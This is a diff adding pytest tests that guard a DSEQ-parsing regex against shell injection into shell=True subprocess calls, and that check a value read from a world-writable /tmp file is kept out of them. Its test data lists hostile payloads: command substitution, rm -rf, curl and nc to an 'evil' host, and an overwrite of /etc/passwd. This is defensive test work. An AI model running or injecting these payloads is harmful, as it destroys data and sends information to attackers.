@@ -15,6 +15,8 @@ import tempfile
 import textwrap
 from pathlib import Path
 
+import pytest
+
 from just_akash.test_shell_e2e import _DSEQ_ANY_RE, _DSEQ_SUMMARY_RE, _decoded
 
 #: Long enough that the child is still alive when the parent gives up, short
@@ -779,3 +781,71 @@ def test_a_normal_sized_tee_log_still_comes_back_whole(monkeypatch, tmp_path):
     segments = _tse._read_tee_log(time.time() - 5)
     assert len(segments) == 1, "a small file was split; the bound is firing too early"
     assert _findall_streams(_DSEQ_ANY_RE, *segments) == ["1788999000555"]
+
+
+# ── the digits-only capture is a shell-injection barrier ─────────────────────
+
+_SHELL_PAYLOADS = [
+    "DSEQ=1; rm -rf /tmp/pwned",
+    "DSEQ: 1 && curl http://evil/",
+    "DSEQ=$(whoami)",
+    "DSEQ=`id`",
+    "DSEQ=1|nc evil 1234",
+    "DSEQ=1 > /etc/passwd",
+    "DSEQ='; touch /tmp/pwned; '",
+    "DSEQ=../../../etc/passwd",
+    "DSEQ=1\nDSEQ=2; reboot",
+]
+
+
+@pytest.mark.parametrize("payload", _SHELL_PAYLOADS)
+def test_the_dseq_capture_is_digits_only_because_it_reaches_a_shell(payload):
+    """⛔ `(\\d+)` IS THE WHOLE BARRIER BETWEEN PARSED OUTPUT AND `shell=True`.
+
+    The captured DSEQ is interpolated into six commands run through
+    `subprocess.run(..., shell=True)` — `test_shell_e2e.py:476, 510, 547, 562, 580,
+    621` — and into a log line at :309 that invites a human to paste it into their
+    own terminal. Nothing between the patterns and those sites says so; they are
+    ~400 lines apart.
+
+    ⚠ THIS PR WIDENS DSEQ EXTRACTION, which makes the dangerous edit the natural
+    one: the first time a DSEQ appears in an unexpected shape, `(\\d+)` -> `(\\S+)`
+    looks like a one-character generalisation. It would turn a world-writable /tmp
+    file into shell input. Before this test, nothing in the suite went red for it.
+
+    Asserted behaviourally — every capture from every pattern must be digits — so it
+    holds however the pattern is spelled, rather than pinning one spelling.
+    """
+    for name, pattern in (("_DSEQ_SUMMARY_RE", _DSEQ_SUMMARY_RE), ("_DSEQ_ANY_RE", _DSEQ_ANY_RE)):
+        for capture in pattern.findall(payload):
+            assert capture.isdigit(), (
+                f"{name} captured {capture!r} from {payload!r} — a non-digit capture is "
+                "interpolated into `shell=True` commands at :476/:510/:547/:562/:580/:621"
+            )
+
+
+def test_the_tmp_derived_candidate_never_reaches_a_shell_interpolation():
+    """⛔ The value read from a WORLD-WRITABLE path must not reach `shell=True`.
+
+    `recovered_dseq` comes from `/tmp/.akash-last-deploy.log`, which anyone can
+    write. It was kept out of `dseq_ref` so an unverified candidate could not reach
+    `robust_destroy` — and that same containment is what keeps it away from the six
+    shell interpolations, which all read `dseq`, derived only from `dseq_ref`.
+
+    The escrow argument and the injection argument are the same argument: an
+    unverified value must not reach a privileged sink. This pins the second sink,
+    which nobody enumerated when the fix was written.
+    """
+    fn = next(n for n in ast.walk(_TREE) if isinstance(n, ast.FunctionDef) and n.name == "main")
+    shell_calls = [
+        n
+        for n in ast.walk(fn)
+        if isinstance(n, ast.Call) and isinstance(n.func, ast.Name) and n.func.id == "run"
+    ]
+    assert shell_calls, "no run() calls found in main — re-anchor, do not delete"
+    for call in shell_calls:
+        names = {m.id for m in ast.walk(call) if isinstance(m, ast.Name)}
+        assert "recovered_dseq" not in names, (
+            "recovered_dseq is interpolated into a run() command; it is read from a "
+            "world-writable /tmp path and reaches subprocess with shell=True"
+        )
